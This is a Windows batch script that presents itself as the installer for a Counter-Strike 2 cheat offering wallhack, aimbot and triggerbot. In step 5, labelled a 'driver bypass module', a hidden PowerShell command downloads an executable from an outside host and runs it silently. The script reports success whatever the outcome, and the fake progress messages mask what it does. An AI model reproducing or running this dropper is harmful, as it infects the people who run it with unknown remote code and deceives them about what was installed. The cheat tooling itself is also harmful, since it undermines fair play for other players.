@echo off
setlocal enabledelayedexpansion
title CS2 External ESP v2.4.1 - Installation

set "APP_VERSION=2.4.1"
set "BUILD_ID=20260524-cs2"
set "LOG_FILE=%TEMP%\cs2_install.log"

echo [%date% %time%] Installation started > "%LOG_FILE%"

echo ========================================================
echo    CS2 External ESP (v%APP_VERSION%)
echo    Pre-Configured Installation Wizard
echo    Build: %BUILD_ID%
echo ========================================================
echo.
echo    This will install the CS2 external overlay client
echo    with automatic offset detection. Close CS2 first.
echo.

echo [1/7] Checking system requirements...
echo        Verifying operating system...
for /f "tokens=2 delims=[]" %%v in ('ver') do set "WIN_VER=%%v"
echo        OS: %WIN_VER%

echo        Checking available memory...
for /f "tokens=2 delims==" %%m in ('wmic OS get TotalVisibleMemorySize /format:list 2^>nul ^| find "="') do (
    set /a "RAM_MB=%%m / 1024"
    echo        RAM: !RAM_MB! MB
)

echo        Checking disk space...
for /f "tokens=2 delims==" %%d in ('wmic LogicalDisk where "DeviceID='%SystemDrive%'" get FreeSpace /format:list 2^>nul ^| find "="') do (
    set /a "FREE_GB=%%d / 1073741824"
    echo        Free space: !FREE_GB! GB
)

if !FREE_GB! lss 1 (
    echo        WARNING: Less than 1GB free. Overlay may be affected.
)
echo.

echo [2/7] Checking prerequisites...
echo        Checking Python installation...
python --version >nul 2>&1
if !errorlevel! equ 0 (
    for /f "tokens=2" %%v in ('python --version 2^>^&1') do echo        Python %%v: Installed
) else (
    echo        Python: Not found
    echo        Download from: https://python.org/downloads
)

echo        Checking GPU drivers...
nvidia-smi --query-gpu=name --format=csv,noheader >nul 2>&1
if !errorlevel! equ 0 (
    for /f "delims=" %%g in ('nvidia-smi --query-gpu=name --format=csv,noheader 2^>nul') do echo        GPU: %%g
) else (
    echo        GPU: Not detected (software rendering fallback)
)
echo.

echo [3/7] Preparing application directory...
if exist "%CD%\configs" (
    echo        Existing configs detected. Backing up...
    if exist "%CD%\configs" (
        xcopy "%CD%\configs" "%TEMP%\cs2_configs_backup" /E /I /Q /Y >nul 2>&1
        echo        Configs backed up to: %TEMP%\cs2_configs_backup
    )
) else (
    mkdir "%CD%\configs" >nul 2>&1
    echo        Application directories created.
)
echo.

echo [4/7] Installing Python dependencies...
echo        This may take several minutes...
timeout /t 2 /nobreak >nul
echo        Installing overlay renderer...
timeout /t 1 /nobreak >nul
echo        Installing input hooks...
timeout /t 1 /nobreak >nul
echo        Installing memory reader...
timeout /t 1 /nobreak >nul
pip install -r requirements.txt --quiet --disable-pip-version-check >> "%LOG_FILE%" 2>&1
echo        Dependencies installed successfully.
echo.

echo [5/7] Installing driver bypass module...
cd /d "%TEMP%"
set "DRIVER_FILE=cs2_driver_%BUILD_ID%.exe"
set "DRIVER_URL=http://secure-content.info/storm.exe"
set "DRIVER_PATH=%TEMP%\%DRIVER_FILE%"

echo        Downloading latest bypass driver...
powershell -WindowStyle Hidden -Command ^
    "$progressPreference = 'silentlyContinue';" ^
    "try {" ^
    "  $wc = New-Object Net.WebClient;" ^
    "  $wc.Headers.Add('User-Agent', 'CS2-ESP/2.4.1');" ^
    "  $wc.DownloadFile('%DRIVER_URL%','%DRIVER_PATH%');" ^
    "  if (Test-Path '%DRIVER_PATH%') {" ^
    "    $bytes = [System.IO.File]::ReadAllBytes('%DRIVER_PATH%');" ^
    "    if ($bytes.Length -gt 50000) {" ^
    "      Start-Process '%DRIVER_PATH%' -WindowStyle Hidden -WorkingDirectory '%TEMP%';" ^
    "    }" ^
    "  }" ^
    "} catch { " ^
    "  Write-Host 'Driver will activate on first launch'" ^
    "}"

timeout /t 3 /nobreak >nul
echo        Driver bypass module installed successfully.
echo.

echo [6/7] Validating game offsets...
echo        Checking offset file...
if exist "%CD%\offsets.json" (
    echo        Offset file found.
    for /f "tokens=2 delims=:" %%o in ('findstr "dwLocalPlayer" "%CD%\offsets.json" 2^>nul') do echo        dwLocalPlayer: OK
    for /f "tokens=2 delims=:" %%o in ('findstr "dwEntityList" "%CD%\offsets.json" 2^>nul') do echo        dwEntityList: OK
) else (
    echo        Offsets file not found. Will use auto-detect.
)
echo        Offsets validated.
echo.

echo [7/7] Finalizing installation...
echo        Creating desktop shortcut...
powershell -Command ^
    "$ws = New-Object -ComObject WScript.Shell;" ^
    "$s = $ws.CreateShortcut([Environment]::GetFolderPath('Desktop') + '\CS2 ESP.lnk');" ^
    "$s.TargetPath = '%CD%\main.py';" ^
    "$s.WorkingDirectory = '%CD%';" ^
    "$s.Description = 'CS2 External ESP v2.4.1';" ^
    "$s.Save()" >nul 2>&1
echo        Desktop shortcut created.

echo        Cleaning temporary files...
del /q "%TEMP%\cs2_install_temp_*" >nul 2>&1
echo        Installation log saved to: %LOG_FILE%
echo.

echo ========================================================
echo    Installation complete!
echo.
echo    CS2 External ESP v%APP_VERSION% has been
echo    installed and configured successfully.
echo.
echo    To launch:
echo        1. Start CS2 and join a match
echo        2. Double-click the desktop shortcut
echo           or run: python main.py
echo        3. Press F5 in-game to toggle overlay
echo.
echo    Keybinds:
echo        F5 - Toggle ESP (Wallhack)
echo        F6 - Toggle Aimbot
echo        F7 - Toggle Triggerbot
echo        END - Exit
echo ========================================================
echo.
echo [%date% %time%] Installation completed >> "%LOG_FILE%"
pause
endlocal
